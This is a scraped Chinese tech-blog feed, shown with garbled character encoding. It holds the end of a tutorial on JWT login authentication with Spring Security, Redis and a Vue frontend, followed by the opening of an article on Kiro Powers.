        <span class="hljs-comment">// è®¾ç½®å“åº”çš„å†…å®¹ç±»å‹ä¸ºJSONæ ¼å¼ï¼Œå­—ç¬¦ç¼–ç ä¸ºUTF-8</span>
        response.setContentType(<span class="hljs-string">"application/json;charset=UTF-8"</span>);
        
        <span class="hljs-comment">// ä»è®¤è¯å¯¹è±¡ä¸­è·å–å·²è®¤è¯çš„ç”¨æˆ·ä¿¡æ¯</span>
        <span class="hljs-type">LoginUser</span> <span class="hljs-variable">principal</span> <span class="hljs-operator">=</span> (LoginUser) authentication.getPrincipal();
        
        <span class="hljs-comment">// 1. æ ¹æ®ç”¨æˆ·ä¿¡æ¯ç”ŸæˆJWTä»¤ç‰Œ</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> jwtUtil.creatToken(principal);

        <span class="hljs-comment">// 2. å°†ç”Ÿæˆçš„ä»¤ç‰Œå­˜å‚¨åˆ°Redisä¸­ï¼Œç”¨äºåç»­éªŒè¯</span>
        <span class="hljs-comment">// Redisçš„é”®æ ¼å¼ä¸º: security:user:login (å®šä¹‰åœ¨Constantä¸­)</span>
        <span class="hljs-comment">// Redisçš„å­—æ®µä¸º: ç”¨æˆ·ID</span>
        <span class="hljs-comment">// Redisçš„å€¼ä¸º: JWTä»¤ç‰Œ</span>
        redisTemplate.opsForHash().put(Constant.REDIS_TOKEN_KEY,String.valueOf(principal.getId()), token);

        <span class="hljs-comment">// 3. æ„å»ºæˆåŠŸå“åº”ç»“æœ</span>
        <span class="hljs-type">R</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> R.builder()
                    .code(<span class="hljs-number">200</span>)           <span class="hljs-comment">// æˆåŠŸçŠ¶æ€ç </span>
                    .msg(<span class="hljs-string">"ç™»å½•æˆåŠŸï¼"</span>)     <span class="hljs-comment">// æˆåŠŸæç¤ºä¿¡æ¯</span>
                    .data(token)         <span class="hljs-comment">// è¿”å›JWTä»¤ç‰Œ</span>
                    .build();
        
        <span class="hljs-comment">// 4. å°†å“åº”å¯¹è±¡è½¬æ¢ä¸ºJSONå­—ç¬¦ä¸²å¹¶å†™å…¥å“åº”ä½“</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">jsonStr</span> <span class="hljs-operator">=</span> JSONUtil.toJsonStr(result);
        response.getWriter().write(jsonStr);
    }
}
</code></pre>
<h3 data-id="heading-16">3.5 éªŒè¯</h3>
<p>æ‰“å¼€ç™»å½•é¡µé¢ï¼Œç‚¹å‡»ç™»å½•ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æ•°æ®åº“ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸå­˜å‚¨äº†è¿™ä¸ªidä¸º1çš„ç”¨æˆ·çš„ç™»å½•token <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dee13355d1e44df08ecebee16c69990b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqg5rSb5pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769655956&amp;x-signature=YPX3pbKKF5%2FpAOxcnOpjgWUona8%3D" alt="image.png" width="70%" loading="lazy"/></p>
<h2 data-id="heading-17">å››ã€è¯·æ±‚éªŒè¯</h2>
<p>é™¤äº†æˆ‘ä»¬é…ç½®çš„æ— éœ€éªŒè¯çš„URLä»¥å¤–çš„å…¶ä»–è¯·æ±‚ï¼Œspringsecurityéƒ½ä¼šä¸ºæˆ‘ä»¬éªŒè¯è¯¥è¯·æ±‚çš„å‘èµ·è€…æ˜¯å¦ç™»å½•ï¼Œå› æ­¤æ¯æ¬¡è¯·æ±‚ä¸­æˆ‘ä»¬éƒ½éœ€è¦åœ¨è¯·æ±‚å¤´æºå¸¦æˆ‘ä»¬çš„tokenï¼Œç„¶åå¯¹æ¯”tokenï¼Œå½“æ‰€æœ‰æ­¥éª¤éƒ½é€šè¿‡åï¼Œæˆ‘ä»¬åœ¨securityä¸Šä¸‹æ–‡å­˜å…¥ä¸€ä¸ªç™»å½•å¯¹è±¡å³å¯éªŒè¯é€šè¿‡å®Œæˆè¯·æ±‚ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4919d86fe394593b5d840c219f370d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqg5rSb5pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769655956&amp;x-signature=ZyK2eC2m5zdU%2FJNobkEduJsTgeI%3D" alt="image.png" loading="lazy"/></p>
<p>è‡³äºåœ¨å“ªéªŒè¯ï¼Œè‡ªç„¶æ˜¯æ‰‹å†™ä¸€ä¸ªè¿‡æ»¤å™¨æ¥éªŒè¯ï¼Œæ¥çœ‹ä¸‹é¢ç¯èŠ‚ã€‚</p>
<h3 data-id="heading-18">4.1 è¿‡æ»¤å™¨</h3>
<p>è¯¥è¿‡æ»¤å™¨ç»§æ‰¿è‡ª<code>OncePerRequestFilter</code>ï¼Œç¡®ä¿æ¯æ¬¡è¯·æ±‚åªè¢«æ‰§è¡Œä¸€æ¬¡ã€‚
è¿‡æ»¤å™¨çš„ä¸»è¦èŒè´£åŒ…æ‹¬ï¼š</p>
<ol>
<li>æ£€æŸ¥è¯·æ±‚æ˜¯å¦ä¸ºç™»å½•è¯·æ±‚ï¼Œå¦‚æœæ˜¯åˆ™ç›´æ¥æ”¾è¡Œ</li>
<li>éªŒè¯è¯·æ±‚ä¸­çš„JWTä»¤ç‰Œæ˜¯å¦åˆæ³•</li>
<li>æ£€æŸ¥Redisä¸­å­˜å‚¨çš„ä»¤ç‰Œä¸è¯·æ±‚ä»¤ç‰Œæ˜¯å¦ä¸€è‡´</li>
<li>å°†å·²éªŒè¯çš„ç”¨æˆ·ä¿¡æ¯è®¾ç½®åˆ°Spring Securityä¸Šä¸‹æ–‡ä¸­</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * JWTä»¤ç‰Œè¿‡æ»¤å™¨ï¼Œè´Ÿè´£éªŒè¯è¯·æ±‚ä¸­çš„JWTä»¤ç‰Œ
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TokenFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OncePerRequestFilter</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> JWTUtil jwtUtil;
    
    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;

    <span class="hljs-comment">/**
     * æ‰§è¡Œè¿‡æ»¤å™¨çš„æ ¸å¿ƒæ–¹æ³•
     * 
     * <span class="hljs-doctag">@param</span> request  HttpServletRequestå¯¹è±¡
     * <span class="hljs-doctag">@param</span> response HttpServletResponseå¯¹è±¡
     * <span class="hljs-doctag">@param</span> filterChain FilterChainå¯¹è±¡ï¼Œç”¨äºæ‰§è¡Œåç»­è¿‡æ»¤å™¨
     * <span class="hljs-doctag">@throws</span> ServletException Servletå¼‚å¸¸
     * <span class="hljs-doctag">@throws</span> IOException IOå¼‚å¸¸
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilterInternal</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, 
                                  FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException {
        
        <span class="hljs-comment">// è®¾ç½®å“åº”å†…å®¹ç±»å‹ä¸ºJSONæ ¼å¼</span>
        response.setContentType(<span class="hljs-string">"application/json;charset=UTF-8"</span>);
        
        <span class="hljs-comment">// 1. æ£€æŸ¥æ˜¯å¦ä¸ºç™»å½•è¯·æ±‚ï¼Œå¦‚æœæ˜¯åˆ™ç›´æ¥æ”¾è¡Œï¼Œè®©åç»­è¿‡æ»¤å™¨é“¾å¤„ç†</span>
        <span class="hljs-keyword">if</span> (request.getRequestURI().equals(Constant.LOGIN_URL)) {
            filterChain.doFilter(request, response);
            <span class="hljs-keyword">return</span>; <span class="hljs-comment">// ç¡®ä¿åœ¨åŒ¹é…ç™»å½•URLæ—¶ç›´æ¥è¿”å›</span>
        }
        
        <span class="hljs-comment">// 2. ä»è¯·æ±‚å¤´ä¸­è·å–JWTä»¤ç‰Œ</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> request.getHeader(Constant.HEADER_TOKEN_NAME);
        
        <span class="hljs-comment">// 3. æ£€æŸ¥ä»¤ç‰Œæ˜¯å¦å­˜åœ¨</span>
        <span class="hljs-keyword">if</span> (!StringUtils.hasText(token)) {
            <span class="hljs-comment">// ä»¤ç‰Œä¸ºç©ºï¼Œè¿”å›é”™è¯¯å“åº”</span>
            sendErrorResponse(response, <span class="hljs-number">901</span>, <span class="hljs-string">"è¯·æ±‚tokenä¸ºç©º"</span>);
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// 4. éªŒè¯JWTä»¤ç‰Œæ˜¯å¦åˆæ³•</span>
        <span class="hljs-keyword">if</span> (!jwtUtil.verify(token)) {
            <span class="hljs-comment">// ä»¤ç‰Œéæ³•ï¼Œè¿”å›é”™è¯¯å“åº”</span>
            sendErrorResponse(response, <span class="hljs-number">902</span>, <span class="hljs-string">"è¯·æ±‚tokenéæ³•"</span>);
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// 5. ä»JWTä¸­æå–ç”¨æˆ·ä¿¡æ¯</span>
        LoginUser loginUser;
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> jwtUtil.getPayload(token);
            loginUser = JSONUtil.toBean(payload, LoginUser.class);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// è§£æç”¨æˆ·ä¿¡æ¯å¤±è´¥ï¼Œè¿”å›é”™è¯¯å“åº”</span>
            sendErrorResponse(response, <span class="hljs-number">904</span>, <span class="hljs-string">"ç”¨æˆ·ä¿¡æ¯è§£æå¤±è´¥"</span>);
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// 6. éªŒè¯Redisä¸­çš„ä»¤ç‰Œæ˜¯å¦ä¸å½“å‰ä»¤ç‰Œä¸€è‡´ï¼ˆåŒé‡éªŒè¯ï¼Œé˜²æ­¢ä»¤ç‰Œç›—ç”¨ï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">redisToken</span> <span class="hljs-operator">=</span> (String) redisTemplate.opsForHash().get(
                Constant.REDIS_TOKEN_KEY, String.valueOf(loginUser.getId()));
        
        <span class="hljs-keyword">if</span> (redisToken == <span class="hljs-literal">null</span> || !token.equals(redisToken)) {
            <span class="hljs-comment">// Redisä¸­ä¸å­˜åœ¨å¯¹åº”çš„ä»¤ç‰Œæˆ–ä»¤ç‰Œä¸åŒ¹é…ï¼Œè¿”å›é”™è¯¯å“åº”</span>
            sendErrorResponse(response, <span class="hljs-number">903</span>, <span class="hljs-string">"è¯·æ±‚tokené”™è¯¯"</span>);
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// 7. ä»¤ç‰ŒéªŒè¯é€šè¿‡ï¼Œå°†ç”¨æˆ·ä¿¡æ¯è®¾ç½®åˆ°Spring Securityä¸Šä¸‹æ–‡ä¸­</span>
        <span class="hljs-comment">// åˆ›å»ºè®¤è¯ä»¤ç‰Œå¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«ç”¨æˆ·ä¿¡æ¯å’Œæƒé™ä¿¡æ¯</span>
        <span class="hljs-type">UsernamePasswordAuthenticationToken</span> <span class="hljs-variable">authenticationToken</span> <span class="hljs-operator">=</span> 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UsernamePasswordAuthenticationToken</span>(loginUser, <span class="hljs-literal">null</span>, 
                                                  AuthorityUtils.NO_AUTHORITIES);
        
        <span class="hljs-comment">// å°†è®¤è¯å¯¹è±¡è®¾ç½®åˆ°Securityä¸Šä¸‹æ–‡ä¸­ï¼Œä»¥ä¾¿åç»­ç»„ä»¶ä½¿ç”¨</span>
        SecurityContextHolder.getContext().setAuthentication(authenticationToken);
        
        <span class="hljs-comment">// 8. æ”¾è¡Œè¯·æ±‚ï¼Œç»§ç»­æ‰§è¡Œåç»­è¿‡æ»¤å™¨é“¾</span>
        filterChain.doFilter(request, response);
    }

    <span class="hljs-comment">/**
     * å‘é€é”™è¯¯å“åº”
     *
     * <span class="hljs-doctag">@param</span> response HttpServletResponseå¯¹è±¡
     * <span class="hljs-doctag">@param</span> code é”™è¯¯ä»£ç 
     * <span class="hljs-doctag">@param</span> message é”™è¯¯æ¶ˆæ¯
     * <span class="hljs-doctag">@throws</span> IOException IOå¼‚å¸¸
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendErrorResponse</span><span class="hljs-params">(HttpServletResponse response, <span class="hljs-type">int</span> code, String message)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">R</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> R.builder().code(code).msg(message).build();
        response.setStatus(HttpServletResponse.SC_UNAUTHORIZED); <span class="hljs-comment">// è®¾ç½®HTTPçŠ¶æ€ç ä¸º401</span>
        response.getWriter().write(JSONUtil.toJsonStr(result));
    }
}
</code></pre>
<h3 data-id="heading-19">4.2 SecurityConfig</h3>
<p>æˆ‘ä»¬ä¹‹å‰å†™è¿‡è¿™ä¸ªconfigï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬åˆšåˆšå†™çš„filteræ·»åŠ åˆ°securityè¿‡æ»¤é“¾é‡Œé¢å»</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * åˆ›å»ºä¸€ä¸ª SecurityFilterChain å¯¹è±¡ï¼Œç”¨äºé…ç½® Spring Security çš„å®‰å…¨è¿‡æ»¤é“¾
 */</span>
<span class="hljs-meta">@Bean</span>
<span class="hljs-keyword">public</span> SecurityFilterChain <span class="hljs-title function_">securityFilterChain</span><span class="hljs-params">(HttpSecurity httpSecurity,CorsConfigurationSource configurationSource)</span> <span class="hljs-keyword">throws</span> Exception {
    httpSecurity
            .formLogin((formLogin) -&gt; formLogin.loginProcessingUrl(Constant.LOGIN_URL)
                    .successHandler(myAuthenticationSuccessHandler) <span class="hljs-comment">// ç™»å½•æˆåŠŸå¤„ç†å™¨ å¦‚æœç™»å½•æˆåŠŸï¼Œåˆ™ä¼šæ‰§è¡Œé‡Œé¢çš„ä»£ç </span>
                    .failureHandler(failAuthenticationFailureHandler) <span class="hljs-comment">// ç™»å½•å¤±è´¥å¤„ç†å™¨ å¦‚æœç™»å½•å¤±è´¥ï¼Œåˆ™ä¼šæ‰§è¡Œé‡Œé¢çš„ä»£ç </span>
            )
            .logout(logout-&gt;
                    logout.logoutUrl(Constant.LOGOUT_URL).logoutSuccessHandler(myLogoutSuccessHandler)
            )
            .authorizeHttpRequests((authorize) -&gt;
                    authorize.requestMatchers(Constant.LOGIN_URL).permitAll().anyRequest().authenticated())
            .csrf(AbstractHttpConfigurer::disable)
            <span class="hljs-comment">//æ”¯æŒè·¨åŸŸè¯·æ±‚</span>
            .cors( (cors) -&gt; cors.configurationSource(configurationSource))
            .sessionManagement(
                    <span class="hljs-comment">// SESSIONåˆ›å»ºç­–ç•¥</span>
                    session-&gt;session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            <span class="hljs-comment">// åœ¨ç™»å½•filteråæ·»åŠ tokenè¿‡æ»¤å™¨</span>
            .addFilterAfter(tokenFilter, UsernamePasswordAuthenticationFilter.class);
    <span class="hljs-keyword">return</span> httpSecurity.build();
}
</code></pre>
<h3 data-id="heading-20">4.3 å‰ç«¯</h3>
<p>æˆ‘ä»¬è·å–åˆ°çš„tokenéœ€è¦å­˜å‚¨åœ¨æµè§ˆå™¨å½“ä¸­çš„<code>localStorage</code>ä¸­ï¼Œä»–æ˜¯æµè§ˆå™¨æŒä¹…åŒ–æ•°æ®çš„ä¸€ä¸ªç©ºé—´ï¼Œå³ä½¿å…³é—­æµè§ˆå™¨ä¹Ÿä¸ä¼šæ¸…é™¤æ•°æ®ã€‚</p>
<p>æˆ‘ä»¬å…ˆçœ‹ç™»å½•å‡½æ•°</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>()
  formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'username'</span>, loginForm.<span class="hljs-property">value</span>.<span class="hljs-property">username</span>)
  formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'password'</span>, loginForm.<span class="hljs-property">value</span>.<span class="hljs-property">password</span>)
  <span class="hljs-keyword">let</span> token = <span class="hljs-variable language_">window</span>.<span class="hljs-property">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'token'</span>)
  <span class="hljs-title function_">axios</span>({
    <span class="hljs-attr">url</span>: <span class="hljs-string">'http://localhost:8080/login'</span>,
    <span class="hljs-attr">method</span>: <span class="hljs-string">'post'</span>,
    <span class="hljs-attr">data</span>: formData,
    <span class="hljs-attr">responseType</span>: <span class="hljs-string">'json'</span>,
  })
    .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>)
        <span class="hljs-variable language_">window</span>.<span class="hljs-property">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'token'</span>, res.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>)
        <span class="hljs-comment">// è·³è½¬åˆ°é¦–é¡µ</span>
        router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/home'</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">data</span>.<span class="hljs-property">msg</span>)
      }
    })
    .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err)
    })
}
</code></pre>
<p>homeé¡µå½“ä¸­å†™ä¸€ä¸ªå‡½æ•°è¯·æ±‚ä¸€äº›å›ºå®šæ•°æ®ï¼Œæºå¸¦token</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// è·å–ç”¨æˆ·ä¿¡æ¯</span>
  axios
    .<span class="hljs-title function_">get</span>(<span class="hljs-string">'http://localhost:8080/user'</span>, {
      <span class="hljs-attr">headers</span>: {
        <span class="hljs-attr">token</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'token'</span>),
      },
    })
    .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">data</span>)
    })
})
</code></pre>
<h3 data-id="heading-21">4.4 éªŒè¯</h3>
<p>å…¶å®è¯·æ±‚åªä¼šè·å¾—ä¸€ä¸ªå›ºå®šçš„string <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/052240f2b91b4ef0b7b84077fef8c75b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqg5rSb5pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769655956&amp;x-signature=8AzdL5hObj7g8xZbvwSz8y5jzsI%3D" alt="image.png" width="70%" loading="lazy"/></p>
<p>è€Œå‰ç«¯ç™»å½•æˆåŠŸåç¡®å®è‡ªåŠ¨è·³è½¬åˆ°homeé¡µé¢å¹¶ä¸”æˆåŠŸè·å–åˆ°äº†æ•°æ® <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5687716a5be443d1aed281c32b2691ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqg5rSb5pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769655956&amp;x-signature=jdmtPChNtXqXZo1AlFkO06YuVwc%3D" alt="image.png" width="70%" loading="lazy"/></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹åˆ é™¤è¯·æ±‚å¤´ä¸­çš„tokenä¼šè¿”å›ä»€ä¹ˆ <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d16ecb79131460b82671cb8cb058cc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqg5rSb5pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769655956&amp;x-signature=5336cjOlRG6CM3WmjapJg7ov6UY%3D" alt="image.png" width="70%" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kiro Powers]]></title>    <link>https://juejin.cn/post/7597709339981692968</link>    <guid>https://juejin.cn/post/7597709339981692968</guid>    <pubDate>2026-01-22T02:21:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597709339981692968" data-draft-id="7597664587459395619" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Kiro Powers "/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-22T02:21:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‡¯å“¥1970"/> <meta itemprop="url" content="https://juejin.cn/user/3954283342211335"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Kiro Powers 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3954283342211335/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‡¯å“¥1970
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T02:21:08.000Z" title="Thu Jan 22 2026 02:21:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡æ˜¯è®²çš„ Kiro Power ç”Ÿæ€ç³»ç»ŸæŠ€æœ¯è§£æ„ã€‚æ¢è®¨ Power ç»„ä»¶çš„ç²¾ç¡®å¥æ³•ç»“æ„ã€æ§åˆ¶å…¶æ¿€æ´»çš„ç®—æ³•é€»è¾‘ã€å…¶ä¸æ¨¡å‹ä¸Šä¸‹æ–‡åè®®çš„æ·±å±‚é›†æˆæœºåˆ¶ï¼Œä»¥åŠåˆ©ç”¨ AI æ ¹æ®ç°æœ‰æŠ€æœ¯æ–‡æ¡£è‡ªåŠ¨ç”Ÿæˆ Power é…ç½®æ–‡ä»¶ç­‰ã€‚</p>
<h2 data-id="heading-0">1. æ‰§è¡Œæ‘˜è¦ä¸æ ¸å¿ƒæ¶æ„ç†å¿µ</h2>
